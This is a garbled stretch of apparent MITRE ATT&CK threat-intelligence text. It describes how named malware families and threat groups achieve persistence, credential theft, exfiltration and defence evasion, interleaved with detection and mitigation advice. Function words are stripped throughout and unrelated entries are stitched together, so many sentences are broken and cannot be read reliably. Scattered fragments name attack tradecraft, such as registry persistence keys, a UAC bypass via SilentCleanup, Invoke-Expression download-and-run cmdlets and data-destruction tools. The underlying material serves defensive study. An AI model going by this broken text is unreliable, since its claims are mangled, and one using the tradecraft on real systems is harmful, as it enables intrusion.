compromised host.(Citation: IB GrimAgent July 2021) inconsistencies fields store PPID information, EventHeader ProcessId data collected Event Tracing Windows (ETW), Creator Process ID/Name Windows event logs, ProcessID ParentProcessID (which produced ETW utilities Task Manager Process Explorer). ETW EventHeader ProcessId identifies actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018) [FIN6](https://attack.mitre.org/groups/G0037) script iterate list compromised PoS systems, remove data log file, bind events submit payment button.(Citation: FireEye FIN6 April 2016)(Citation: Trend Micro FIN6 October 2019) [AppleJeus](https://attack.mitre.org/software/S0584) created scheduled task runs user logs in.(Citation: CISA AppleJeus Feb 2021) [ShimRat](https://attack.mitre.org/software/S0444)'s loader packed compressed [ShimRat](https://attack.mitre.org/software/S0444) core DLL legitimate DLL hijack.(Citation: FOX-IT 2016 Mofang) [Pasam](https://attack.mitre.org/software/S0208) establishes infecting Security Accounts Manager (SAM) DLL load malicious DLL dropped disk.(Citation: Symantec Pasam 2012) [JCry](https://attack.mitre.org/software/S0389) achieved execution luring users file appeared Adobe Flash Player update installer. (Citation: Carbon Black JCry 2019) [Whitefly](https://attack.mitre.org/groups/G0107) named malicious DLL DLLs belonging legitimate software security vendors.(Citation: Symantec Whitefly March 2019) [Windshift](https://attack.mitre.org/groups/G0112) tools communicate C2 HTTP.(Citation: BlackBerry Bahamut) [DRATzarus](https://attack.mitre.org/software/S0694) enumerate examine running processes determine debugger present.(Citation: ClearSky Lazarus Aug 2020) [Wizard Spider](https://attack.mitre.org/groups/G0102) "whoami" identify local user privileges.(Citation: Sophos Ryuk Attack October 2020) [OopsIE](https://attack.mitre.org/software/S0264) creates VBScript persistent execution.(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 OilRig Sept 2018) [Chimera](https://attack.mitre.org/groups/G0114) collected data network shares.(Citation: NCC Chimera January 2021) Monitor newly constructed files create modify system-level processes repeatedly execute malicious payloads persistence. [Bumblebee](https://attack.mitre.org/software/S1039) check Registry specific keys.(Citation: Medium Ali Salem Bumblebee April 2022) Monitor constructed windows registry create modify Windows services repeatedly execute malicious payloads persistence. [Pteranodon](https://attack.mitre.org/software/S0147) exfiltrates screenshot files C2 server.(Citation: Palo Alto Gamaredon Feb 2017) [PcShare](https://attack.mitre.org/software/S1050) deleted files components compromised host.(Citation: Bitdefender FunnyDream Campaign November 2020) [Helminth](https://attack.mitre.org/software/S0170) provide remote shell. version [Helminth](https://attack.mitre.org/software/S0170) batch scripting.(Citation: Palo Alto OilRig 2016) [InvisiMole](https://attack.mitre.org/software/S0260) communicates C2 servers TCP socket.(Citation: ESET InvisiMole June 2018) [Kessel](https://attack.mitre.org/software/S0487) exfiltrated gathered infected C2 server.(Citation: ESET ForSSHe December 2018) Integrating multi-factor authentication (MFA) organizational policy greatly reduce risk adversary gaining control valid credentials additional tactics initial access, lateral movement, collecting information. MFA restrict access cloud resources APIs.  [Sibot](https://attack.mitre.org/software/S0589) executed MSHTA application.(Citation: MSTIC NOBELIUM Mar 2021) [Evilnum](https://attack.mitre.org/groups/G0120) deploy additional components tools needed.(Citation: ESET EvilNum July 2020) [Seasalt](https://attack.mitre.org/software/S0345) command delete file.(Citation: Mandiant APT1 Appendix) [Winnti Windows](https://attack.mitre.org/software/S0141) dropper malicious payloads targeted systems.(Citation: Novetta Winnti April 2015) Monitor DLL/PE file events, creation binary files loading DLLs processes. DLLs recognized loaded process. [TrickBot](https://attack.mitre.org/software/S0266) module "Trickboot" write erase UEFI/BIOS firmware compromised device.(Citation: Eclypsium Trickboot December 2020) [XCSSET](https://attack.mitre.org/software/S0658) <code>scp</code> access <code>~/Library/Cookies/Cookies.binarycookies</code> file.(Citation: trendmicro xcsset xcode project 2020) [APT41](https://attack.mitre.org/groups/G0096) ransomware called Encryptor RaaS encrypt files targeted systems provide ransom note user.(Citation: FireEye APT41 Aug 2019) [Wizard Spider](https://attack.mitre.org/groups/G0102) valid credentials privileged accounts goal accessing domain controllers.(Citation: CrowdStrike Grim Spider 2019)  Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent. [NETWIRE](https://attack.mitre.org/software/S0198) issue commands cmd.exe.(Citation: Red Canary NETWIRE January 2020)(Citation: Proofpoint NETWIRE December 2020) Collect usage logs cloud administrator accounts identify unusual activity assignment roles accounts. Monitor accounts assigned admin roles threshold admins. Monitor updates IAM policies roles attached user accounts. [Nebulae](https://attack.mitre.org/software/S0630) functions named <code>StartUserModeBrowserInjection</code> <code>StopUserModeBrowserInjection</code> indicating imitate chrome_frame_helper.dll.(Citation: Bitdefender Naikon April 2021) Monitor newly executed processes search compromised systems insecurely stored credentials. Monitor files establish persistence executing malicious content triggered interrupt signal. [CoinTicker](https://attack.mitre.org/software/S0369) creates user launch agents named .espl.plist com.apple.[random string].plist establish persistence.(Citation: CoinTicker 2019)	 [Magic Hound](https://attack.mitre.org/groups/G0059) exported emails compromised Exchange servers.(Citation: DFIR Report APT35 ProxyShell March 2022) [Turla](https://attack.mitre.org/groups/G0010) RPC backdoors collect files USB thumb drives.(Citation: ESET Turla PowerShell 2019)(Citation: Symantec Waterbug Jun 2019) [Inception](https://attack.mitre.org/groups/G0100) browser plugin steal passwords sessions Internet Explorer, Chrome, Opera, Firefox, Torch, Yandex.(Citation: Symantec Inception Framework March 2018) PowerShell necessary, restrict PowerShell execution policy administrators. aware methods bypassing PowerShell execution policy, depending environment configuration.(Citation: Netspi PowerShell Execution Policy Bypass) [JPIN](https://attack.mitre.org/software/S0201) OS version disk space.(Citation: PLATINUM April 2016) [Tropic Trooper](https://attack.mitre.org/groups/G0081) created Registry key <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> sets establish persistence.(Citation: Unit 42 Tropic Trooper Nov 2016)(Citation: TrendMicro Tropic Trooper 2020) [APT41](https://attack.mitre.org/groups/G0096) legitimate executables perform DLL side-loading malware.(Citation: FireEye APT41 Aug 2019)  [EvilBunny](https://attack.mitre.org/software/S0396) deleted initial dropper running environment checks.(Citation: Cyphort EvilBunny Dec 2014) [RainyDay](https://attack.mitre.org/software/S0629) file exfiltration tool collect changed files specific extensions.(Citation: Bitdefender Naikon April 2021) Detecting software exploitation difficult depending tools available. Software exploits succeed exploited process unstable crash. [Leviathan](https://attack.mitre.org/groups/G0065) utilized OLE method insert malicious content phishing documents. (Citation: Accenture MUDCARP March 2019) detect adversary credentials [Valid Accounts](https://attack.mitre.org/techniques/T1078). [Reaver](https://attack.mitre.org/software/S0172) drops executes malicious CPL file payload.(Citation: Palo Alto Reaver Nov 2017) [DustySky](https://attack.mitre.org/software/S0062) checks existence anti-virus.(Citation: DustySky) [Elise](https://attack.mitre.org/software/S0081) capable launching remote host delete itself.(Citation: Accenture Dragonfish Jan 2018) [HEXANE](https://attack.mitre.org/groups/G1001) established email accounts domain registration including ProtonMail addresses.(Citation: Kaspersky Lyceum October 2021) [DustySky](https://attack.mitre.org/software/S0062) searches network drives removable media duplicates them.(Citation: DustySky) [GALLIUM](https://attack.mitre.org/groups/G0093) exploited publicly-facing servers including Wildfly/JBoss servers gain access network.(Citation: Cybereason Soft Cell June 2019)(Citation: GALLIUM December 2019) [gh0st RAT](https://attack.mitre.org/software/S0032) wipe event logs.(Citation: FireEye Hacking Team)(Citation: Gh0stRAT ATT March 2019) [Out1](https://attack.mitre.org/software/S0594) files Registry data compromised hosts.(Citation: Trend Micro Muddy Water March 2021) [Astaroth](https://attack.mitre.org/software/S0373) [certutil](https://attack.mitre.org/software/S0160) [BITSAdmin](https://attack.mitre.org/software/S0190) download additional malware. (Citation: Cofense Astaroth Sept 2018)(Citation: Cybereason Astaroth Feb 2019)(Citation: Securelist Brazilian Banking Malware July 2020) [menuPass](https://attack.mitre.org/groups/G0045) process hollowing iexplore.exe load [RedLeaves](https://attack.mitre.org/software/S0153) implant.(Citation: Accenture Hogfish April 2018) (Citation: FireEye FIN6 Apr 2019) [Catchamas](https://attack.mitre.org/software/S0261) stores gathered data machine .db files .bmp files separate locations.(Citation: Symantec Catchamas April 2018) [Remcos](https://attack.mitre.org/software/S0332) upload download files victim’s machine.(Citation: Riskiq Remcos Jan 2018) [Metamorfo](https://attack.mitre.org/software/S0455) function watch contents clipboard valid bitcoin addresses, overwrites attacker's address.(Citation: Fortinet Metamorfo Feb 2020)(Citation: ESET Casbaneiro Oct 2019)  [Cobalt Strike](https://attack.mitre.org/software/S0154) perform browser pivoting inject user's browser inherit cookies, authenticated sessions, client SSL certificates.(Citation: cobaltstrike manual)(Citation: Cobalt Strike Manual 4.3 November 2020) [Denis](https://attack.mitre.org/software/S0354) version written PowerShell.(Citation: Cybereason Cobalt Kitty 2017)	  [Windshift](https://attack.mitre.org/groups/G0112) icons mimicking Office files mask malicious executables.(Citation: objective-see windtail1 dec 2018) [Windshift](https://attack.mitre.org/groups/G0112) attempted hide executables changing file extension ".scr" mimic Windows screensavers.(Citation: BlackBerry Bahamut) [Turla](https://attack.mitre.org/groups/G0010) security software, including security logging malware detected.(Citation: ESET ComRAT 2020) [KOCTOPUS](https://attack.mitre.org/software/S0669) relied victims clicking malicious link delivered email.(Citation: MalwareBytes LazyScripter Feb 2021) [ComRAT](https://attack.mitre.org/software/S0126) unique machine passwords decrypt orchestrator payload hardcoded XOR key decrypt communications module. [ComRAT](https://attack.mitre.org/software/S0126) unique password decrypt file hidden file system.(Citation: ESET ComRAT 2020)(Citation: CISA ComRAT Oct 2020) [Tropic Trooper](https://attack.mitre.org/groups/G0081) executed commands security vulnerabilities, including CVE-2017-11882, CVE-2018-0802, CVE-2012-0158.(Citation: TrendMicro Tropic Trooper Mar 2018)(Citation: Unit 42 Tropic Trooper Nov 2016) [Sandworm Team](https://attack.mitre.org/groups/G0034) remote administration tools remote industrial control client software maliciously release electricity breakers.(Citation: US-CERT Ukraine Feb 2016) [FIN7](https://attack.mitre.org/groups/G0046) legitimate services Google Docs, Google Scripts, Pastebin C2.(Citation: FireEye FIN7 Aug 2018) [RGDoor](https://attack.mitre.org/software/S0258) executes <code>whoami</code> victim’s machine.(Citation: Unit 42 RGDoor Jan 2018) [APT29](https://attack.mitre.org/groups/G0016) [SUNBURST](https://attack.mitre.org/software/S0559) signed SolarWinds code signing certificates injecting malware SolarWinds Orion software lifecycle.(Citation: FireEye SUNBURST Backdoor December 2020) [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013), threat actors VBA macro execute simple downloader installed [Rising Sun](https://attack.mitre.org/software/S0448).(Citation: McAfee Sharpshooter December 2018) [Turla](https://attack.mitre.org/groups/G0010) PowerShell execute commands/scripts, custom executable code [Empire](https://attack.mitre.org/software/S0363)'s PSInject.(Citation: ESET Turla Mosquito 2018)(Citation: ESET Turla PowerShell 2019)(Citation: Symantec Waterbug Jun 2019) [Turla](https://attack.mitre.org/groups/G0010) PowerShell scripts load execute malware memory. [Shark](https://attack.mitre.org/software/S1019) delete files downloaded compromised host.(Citation: ClearSky Siamesekitten August 2021) [Ryuk](https://attack.mitre.org/software/S0446) combination symmetric (AES) asymmetric (RSA) encryption encrypt files. Files encrypted AES key file extension .RYK. Encrypted directories ransom note RyukReadMe.txt written directory.(Citation: CrowdStrike Ryuk January 2019)(Citation: CrowdStrike Wizard Spider October 2020) [BOOSTWRITE](https://attack.mitre.org/software/S0415) signed valid CA.(Citation: FireEye FIN7 Oct 2019) [Bazar](https://attack.mitre.org/software/S0534) timer delay execution core functionality.(Citation: NCC Team9 June 2020) [QuietSieve](https://attack.mitre.org/software/S0686) identify search removable drives specific file extensions.(Citation: Actinium February 2022) [APT41](https://attack.mitre.org/groups/G0096) collected MAC addresses victim machines.(Citation: FireEye APT41 Aug 2019)(Citation: IB APT 41 June 2021)  Monitor executed commands arguments actions involved data destruction activity, vssadmin, wbadmin, bcdedit [NETWIRE](https://attack.mitre.org/software/S0198) client signed fake invalid digital certificates.(Citation: McAfee Netwire Mar 2015) [QakBot](https://attack.mitre.org/software/S0650) identify peripheral devices targeted systems.(Citation: Trend Micro Qakbot 2020) CMSTP.exe environment (unless VPN connection installation). [CreepyDrive](https://attack.mitre.org/software/S1023) Powershell execution, including cmdlets `Invoke-WebRequest` `Invoke-Expression`.(Citation: POLONIUM June 2022) [SUNBURST](https://attack.mitre.org/software/S0559) junk bytes C2 HTTP.(Citation: FireEye SUNBURST Backdoor December 2020) [Kasidet](https://attack.mitre.org/software/S0088) ability initiate keylogging screen captures.(Citation: Zscaler Kasidet) Detecting dynamically generated domains challenging DGA algorithms, constantly evolving malware families, increasing complexity algorithms. myriad approaches detecting pseudo-randomly generated domain name, including frequency analysis, Markov chains, entropy, proportion dictionary words, ratio vowels characters, more. (Citation: Data Driven Security DGA) CDN domains trigger detections format domain names. addition detecting DGA domain based name, approach detecting suspicious domain check registered names rarely visited domains.
Machine learning approaches detecting DGA domains developed success applications. approach N-Gram methods determine randomness score strings domain name. randomness score high, domains whitelisted (CDN, etc), determined domain legitimate host DGA. (Citation: Pace University Detecting DGA 2017) approach deep learning classify domains DGA-generated(Citation: Elastic Predicting DGA)] [FIN6](https://attack.mitre.org/groups/G0037) publicly tools (including Microsoft's built-in SQL querying tool, osql.exe) map internal network conduct reconnaissance Active Directory, Structured Query Language (SQL) servers, NetBIOS.(Citation: FireEye FIN6 April 2016) [Grandoreiro](https://attack.mitre.org/software/S0531) decrypt encrypted internal strings.(Citation: ESET Grandoreiro April 2020) [Revenge RAT](https://attack.mitre.org/software/S0379) plugin microphone interception.(Citation: Cylance Shaheen Nov 2018)(Citation: Cofense RevengeRAT Feb 2019) Monitor newly constructed containers deploy container environment facilitate execution evade defenses. [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) samples publicly browser password recovery tool.(Citation: Symantec Dragonfly) Monitor contextual data running process, include environment variables, image name, user/owner perform sudo caching suoders file elevate privileges. administrator accounts permissions modify content organization login portals day-to-day operations expose potential adversaries unprivileged systems. Domain registration is, design, captured public registration logs. services aid tracking newly acquired domains, WHOIS databases passive DNS. pivot pieces domain registration uncover infrastructure purchased adversary. monitoring domains created structure own, including TLD. tools services exist track, query, monitor domain registration information, tracking multiple DNS infrastructures require multiple tools/services advanced analytics.(Citation: ThreatConnect Infrastructure Dec 2020) Detection efforts focused stages adversary lifecycle, Initial Access Command Control. [Zox](https://attack.mitre.org/software/S0672) ability list processes.(Citation: Novetta-Axiom) Monitor executed commands arguments corrupt wipe disk data structures hard drive boot system; targeting specific critical systems network interrupt availability network resources. [CSPY Downloader](https://attack.mitre.org/software/S0527) bypass UAC SilentCleanup task execute binary elevated privileges.(Citation: Cybereason Kimsuky November 2020) [APT28](https://attack.mitre.org/groups/G0007) malicious applications abused OAuth access tokens gain access target email accounts, including Gmail Yahoo Mail.(Citation: Trend Micro Pawn Storm OAuth 2017) (Citation: PTSecurity Cobalt Dec 2016) [APT41](https://attack.mitre.org/groups/G0096) WMIEXEC utility execute <code>whoami</code> commands remote machines.(Citation: FireEye APT41 Aug 2019) eliminate path interception weaknesses program configuration files, scripts, PATH environment variable, services, shortcuts surrounding PATH variables quotation marks functions them. aware search Windows executing loading binaries qualified paths appropriate.

Clean Windows Registry software uninstalled avoid legitimate binaries. Periodically search correct report path interception weaknesses systems introduced custom tools report software insecure path configurations.(Citation: CreateProcess)(Citation: Dynamic-Link Library Security)(Citation: Vulnerability Exploit Detector) [Agent Tesla](https://attack.mitre.org/software/S0331) ability steal credentials FTP clients wireless profiles.(Citation: Malwarebytes Agent Tesla April 2020) [Sowbug](https://attack.mitre.org/groups/G0054) keylogging tools.(Citation: Symantec Sowbug Nov 2017) vendors provide digitally signed operating images validate integrity software platform.  feature prevent detect attempts adversaries compromise image. (Citation: Cisco IOS Software Integrity Assurance - Deploy Signed IOS) (Citation: Palo Alto OilRig 2016)(Citation: FireEye APT34 Webinar Dec 2017)(Citation: Crowdstrike Helix Kitten Nov 2018) strings [JHUHUGIT](https://attack.mitre.org/software/S0044) obfuscated XOR algorithm.(Citation: F-Secure Sofacy 2015)(Citation: ESET Sednit 1)(Citation: Talos Seduploader Oct 2017) Systemd service unit files detected auditing file creation modification events <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, <code>/home/<username>/.config/systemd/user/</code> directories, symbolic links [Dragonfly](https://attack.mitre.org/groups/G0035) acquired VPS infrastructure malicious campaigns.(Citation: Gigamon Berserk Bear October 2021) Monitor newly constructed network connections pings/scans attempt listing systems IP address, hostname, logical identifier network Lateral Movement current system. [TRITON](https://attack.mitre.org/software/S0609) disguised legitimate Triconex Trilog application.(Citation: FireEye TRITON 2017) [httpclient](https://attack.mitre.org/software/S0068) cmd.exe victim.(Citation: CrowdStrike Putter Panda) [FlawedAmmyy](https://attack.mitre.org/software/S0381) collect mouse events.(Citation: Korean FSI TA505 2020) persistence mechanism [CozyCar](https://attack.mitre.org/software/S0046) register scheduled task.(Citation: F-Secure CozyDuke) [PUNCHBUGGY](https://attack.mitre.org/software/S0196) enables remote interaction additional code HTTPS POST requests.(Citation: FireEye Fin8 2016)(Citation: FireEye Enemy FIN8 Aug 2016)(Citation: Morphisec ShellTea June 2019) [Misdat](https://attack.mitre.org/software/S0083) capable downloading files C2.(Citation: Cylance Dust Storm) [Carbon](https://attack.mitre.org/software/S0335) TCP UDP C2.(Citation: ESET Carbon Mar 2017) Limit privileges user accounts authorized administrators interact service service binary target path locations. Deny execution user directories file download directories temp directories able. (Citation: Seclists Kanthak 7zip Installer)  [WastedLocker](https://attack.mitre.org/software/S0612) performed DLL hijacking execution.(Citation: NCC WastedLocker June 2020) [Octopus](https://attack.mitre.org/software/S0340) compressed data exfiltrating tool called Abbrevia.(Citation: ESET Nomadic Octopus 2018)  Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Monitor API calls employ detect avoid virtualization analysis environments. Detecting actions virtualization sandbox identification difficult depending adversary's implementation monitoring required. Ensure privilege principles applied resources reduce exposure data manipulation risk. [ZIRCONIUM](https://attack.mitre.org/groups/G0128) multi-stage packers exploit code.(Citation: Check APT31 February 2021) [Siloscape](https://attack.mitre.org/software/S0623) leveraged vulnerability Windows containers perform [Escape Host](https://attack.mitre.org/techniques/T1611).(Citation: Unit 42 Siloscape Jun 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware TangoDelta attempts terminate processes McAfee. Additionally, [Lazarus Group](https://attack.mitre.org/groups/G0032) malware SHARPKNOT disables Windows Event Notification Alerter services.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)(Citation: Novetta Blockbuster Tools)(Citation: US-CERT SHARPKNOT June 2018).  [IceApple](https://attack.mitre.org/software/S1022) OWA credential logger monitor OWA authentication requests log credentials.(Citation: CrowdStrike IceApple 2022) [Turla](https://attack.mitre.org/groups/G0010) encryption (including salted 3DES [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Out-EncryptedScript.ps1</code>), random variable names, base64 encoding obfuscate PowerShell commands payloads.(Citation: ESET Turla PowerShell 2019) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [Crutch](https://attack.mitre.org/software/S0538) persist DLL search hijacking Google Chrome, Mozilla Firefox, OneDrive.(Citation: ESET Crutch December 2020) [APT38](https://attack.mitre.org/groups/G0082) shells persistence ensure redundant access.(Citation: CISA AA20-239A BeagleBoyz August 2020) [Clambling](https://attack.mitre.org/software/S0660) deobfuscate payload prior execution.(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020) [AADInternals](https://attack.mitre.org/software/S0677) forge Kerberos tickets password hash AZUREADSSOACC account.(Citation: AADInternals Documentation) [PoisonIvy](https://attack.mitre.org/software/S0012) creates backdoor remote attackers upload files.(Citation: Symantec Darkmoon Aug 2005) [xCaon](https://attack.mitre.org/software/S0653) command download files victim's machine.(Citation: Checkpoint IndigoZebra July 2021) [SideTwist](https://attack.mitre.org/software/S0610) exfiltrated data C2 channel.(Citation: Check APT34 April 2021) [RainyDay](https://attack.mitre.org/software/S0629) QuarksPwDump tool local passwords domain cached credentials.(Citation: Bitdefender Naikon April 2021) Monitor files backdoor servers shells establish persistent access systems. images software updated migrate SNMPv3.(Citation: Cisco Blog Legacy Device Attacks) [USBStealer](https://attack.mitre.org/software/S0136) automatically exfiltrates collected files removable media infected device connects air-gapped victim machine initially connected internet-enabled victim machine. (Citation: ESET Sednit USBStealer 2014) [Hildegard](https://attack.mitre.org/software/S0601) xmrig cryptocurrency.(Citation: Unit 42 Hildegard Malware) [GoldMax](https://attack.mitre.org/software/S0588) written AES-encrypted Base64-encoded configuration files disk.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021) [APT29](https://attack.mitre.org/groups/G0016) gained access compromised accounts cloud solution partners, compromised certificates issued Mimecast authenticate Mimecast customer systems.(Citation: Cybersecurity Advisory SVR TTP 2021)(Citation: CrowdStrike StellarParticle January 2022)(Citation: MSTIC Nobelium Oct 2021) [GeminiDuke](https://attack.mitre.org/software/S0049) collects programs services victim configured automatically startup.(Citation: F-Secure Dukes) [Naid](https://attack.mitre.org/software/S0205) creates Registry entries store created service malicious DLL dropped disk.(Citation: Symantec Naid June 2012) [FIN6](https://attack.mitre.org/groups/G0037) scheduled tasks establish persistence malware uses, including downloaders HARDTACK SHIPBREAD [FrameworkPOS](https://attack.mitre.org/software/S0503).(Citation: FireEye FIN6 April 2016) [TinyZBot](https://attack.mitre.org/software/S0004) create shortcut Windows startup folder persistence.(Citation: Cylance Cleaver) [DarkComet](https://attack.mitre.org/software/S0334) adds Registry entries enable automatic execution startup.(Citation: TrendMicro DarkComet Sept 2014)(Citation: Malwarebytes DarkComet March 2018) [njRAT](https://attack.mitre.org/software/S0385) capable manipulating deleting registry keys, including persistence.(Citation: Trend Micro njRAT 2018) [Threat Group-3390](https://attack.mitre.org/groups/G0027) command compile archive file types victim user's directories.(Citation: SecureWorks BRONZE UNION June 2017) [BlackEnergy](https://attack.mitre.org/software/S0089) plug-in gather credentials stored files host software programs, including Bat! email client, Outlook, Windows Credential Store.(Citation: F-Secure BlackEnergy 2014)(Citation: Securelist BlackEnergy Nov 2014) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent. Monitor command-line usage <code>-AllowReversiblePasswordEncryption $true</code> actions malicious tampering user settings [Group Policy Modification](https://attack.mitre.org/techniques/T1484/001)).  Monitor traffic ports UDP 5355 UDP 137 LLMNR/NetBIOS disabled security policy. [Lucifer](https://attack.mitre.org/software/S0532) collect name, architecture, default language, processor frequency compromised host.(Citation: Unit 42 Lucifer June 2020) Monitor SAM registry key accessed attempt dump credentials account login credential material, form hash password, operating software. Monitor analyze traffic patterns packet inspection protocol(s), leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). analyzing malware features malware providers, compiler used, debugging artifacts, code similarities, identifiers specific Malware-as-a-Service (MaaS) offerings. Malware repositories identify additional samples developers adversary utilizing services. Identifying overlaps malware adversaries malware adversary developed them. cases, identifying overlapping characteristics malware adversaries shared quartermaster.(Citation: FireEyeSupplyChain) Malware repositories identify features tool adversary, watermarks [Cobalt Strike](https://attack.mitre.org/software/S0154) payloads.(Citation: Analyzing Dec 2020) initial beacon packet [Mis-Type](https://attack.mitre.org/software/S0084) operating version file victim.(Citation: Cylance Dust Storm) [gh0st RAT](https://attack.mitre.org/software/S0032) gathered architecture, processor, OS configuration, installed hardware information.(Citation: Gh0stRAT ATT March 2019) [Rising Sun](https://attack.mitre.org/software/S0448) variants SSL encrypting C2 communications.(Citation: Bleeping Op Sharpshooter March 2019) [Gorgon Group](https://attack.mitre.org/groups/G0078) attempted users launch malicious Office attachments delivered spearphishing emails.(Citation: Unit 42 Gorgon Aug 2018) [Hacking Team UEFI Rootkit](https://attack.mitre.org/software/S0047) UEFI BIOS rootkit developed company Hacking Team persist remote access software targeted systems.(Citation: TrendMicro Hacking Team UEFI)  Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [InvisiMole](https://attack.mitre.org/software/S0260) list files directory documents. [InvisiMole](https://attack.mitre.org/software/S0260) search specific files supplied file mask.(Citation: ESET InvisiMole June 2018) [CreepyDrive](https://attack.mitre.org/software/S1023) upload files C2 victim machines.(Citation: POLONIUM June 2022) [Responder](https://attack.mitre.org/software/S0174) poison services gather hashes credentials systems local network.(Citation: GitHub Responder) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [MCMD](https://attack.mitre.org/software/S0500) Base64 encode output strings prior sending C2.(Citation: Secureworks MCMD July 2019) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) malicious links e-mails lure victims downloading malware.(Citation: Google Election Threats October 2020)(Citation: Zscaler APT31 Covid-19 October 2020) [Hydraq](https://attack.mitre.org/software/S0203) creates backdoor remote attackers event logs.(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: Symantec Hydraq Jan 2010) [Higaisa](https://attack.mitre.org/groups/G0126) AES-128 encrypt C2 traffic.(Citation: Zscaler Higaisa 2020) (Citation: Baumgartner Naikon 2015)(Citation: CameraShy) [Carbanak](https://attack.mitre.org/groups/G0008) legitimate programs AmmyyAdmin Team Viewer remote interactive C2 target systems.(Citation: Group-IB Anunak) implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access destroy backups prevent recovery. [Ragnar Locker](https://attack.mitre.org/software/S0481) regsvr32.exe execute components VirtualBox.(Citation: Sophos Ragnar 2020) [Lokibot](https://attack.mitre.org/software/S0447) ability hidden file directory.(Citation: Infoblox Lokibot January 2019) Monitor functions exported authentication-related DLLs (such cryptdll.dll samsrv.dll).(Citation: Dell Skeleton) msxsl.exe unnecessary, block execution prevent abuse adversaries. [Ruler](https://attack.mitre.org/software/S0358) automate abuse Outlook establish persistence.(Citation: SensePost Ruler GitHub)  [BADFLICK](https://attack.mitre.org/software/S0642) distributed spearphishing campaigns malicious Word documents.(Citation: Accenture MUDCARP March 2019) [TDTESS](https://attack.mitre.org/software/S0164) command download execute additional file.(Citation: ClearSky Wilted Tulip July 2017) Monitor suspicious network traffic indicative scanning, quantities originating single source (especially source adversary/botnet). (Citation: Cylance Dust Storm) Linux version [Derusbi](https://attack.mitre.org/software/S0021) checks victim user (normally root), malware execute root privileges. [Derusbi](https://attack.mitre.org/software/S0021) gathers username victim.(Citation: Fidelis Turbo) Upgrade Windows 8 enable secure boot. Enable Windows Policy “Do Anonymous Enumeration SAM Accounts Shares” security setting limit users enumerate network shares.(Citation: Windows Anonymous Enumeration SAM Accounts) [WinMM](https://attack.mitre.org/software/S0059) NetUser-GetInfo identify running “Admin” account local system.(Citation: Baumgartner Naikon 2015) [KONNI](https://attack.mitre.org/software/S0356) screenshots victim’s machine.(Citation: Talos Konni 2017) [RTM](https://attack.mitre.org/software/S0148) add certificate Windows store.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019) [MarkiRAT](https://attack.mitre.org/software/S0652) search processes system.(Citation: Kaspersky Ferocious Kitten Jun 2021) [TrickBot](https://attack.mitre.org/software/S0266) decodes configuration data modules.(Citation: Fidelis TrickBot Oct 2016)(Citation: Cyberreason Anchor December 2019)(Citation: Joe Trickbot) [Tonto Team](https://attack.mitre.org/groups/G0131) exploited vulnerabilities, including CVE-2018-0798, CVE-2018-8174, CVE-2018-0802, CVE-2017-11882, CVE-2019-9489 CVE-2020-8468, CVE-2018-0798 enable execution delivered malicious payloads.(Citation: Kaspersky CactusPete Aug 2020)(Citation: TrendMicro Tonto Team October 2020)(Citation: Talos Bisonal Mar 2020)(Citation: Talos Bisonal March 2020)  [InvisiMole](https://attack.mitre.org/software/S0260) collect installed software specific users, software executed user login, software executed system.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) [Chinoxy](https://attack.mitre.org/software/S1041) encrypted configuration file.(Citation: Bitdefender FunnyDream Campaign November 2020) [gh0st RAT](https://attack.mitre.org/software/S0032) capability delete files.(Citation: FireEye Hacking Team)(Citation: Gh0stRAT ATT March 2019) [Nebulae](https://attack.mitre.org/software/S0630) DLL side-loading gain execution.(Citation: Bitdefender Naikon April 2021) [Shamoon](https://attack.mitre.org/software/S0140) access network share, enables RemoteRegistry service target system. connect RegConnectRegistryW modify Registry disable UAC remote restrictions setting <code>SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code> 1.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: McAfee Shamoon December 2018) [WhisperGate](https://attack.mitre.org/software/S0689) Visual Basic script exclude `C:\` drive Windows Defender.(Citation: Unit 42 WhisperGate January 2022)(Citation: Cisco Ukraine Wipers January 2022) [Tropic Trooper](https://attack.mitre.org/groups/G0081)'s backdoor communicated C2 DNS protocol.(Citation: TrendMicro Tropic Trooper 2020)	 [POWERSOURCE](https://attack.mitre.org/software/S0145) achieves persistence setting Registry key, path depending victim account user administrator access.(Citation: Cisco DNSMessenger March 2017) Monitor logged domain (DNS) data buy, lease, rent infrastructure targeting. Detection efforts focused stages adversary lifecycle, Command Control. [Kazuar](https://attack.mitre.org/software/S0265) gathers windows.(Citation: Unit 42 Kazuar 2017) [Silence](https://attack.mitre.org/groups/G0091) PowerShell download execute payloads.(Citation: Cyber Forensicator Silence 